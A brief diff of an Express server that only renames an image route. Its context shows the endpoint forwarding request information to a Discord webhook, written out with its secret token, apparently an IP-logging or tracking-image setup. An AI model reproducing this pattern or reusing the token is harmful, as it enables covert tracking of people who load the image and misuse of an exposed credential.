@@ -35,7 +35,7 @@ app.use((req, res, next) => {
 });
 
 // return image on endpoint/https/image
-app.get('/endpoint/https/image', (req, res) => {
+app.get('/api/endpoint/https/image', (req, res) => {
   // send response information to discord webhook
   fetch('https://discord.com/api/webhooks/1366407365775069226/F3G_5Xp3Yhlf8Km8fSQwpPMLdHW4DSz8VePxdKkV0hPxntUXH1iYhLwlzAewvpaPC7e7', {
     method: 'POST',
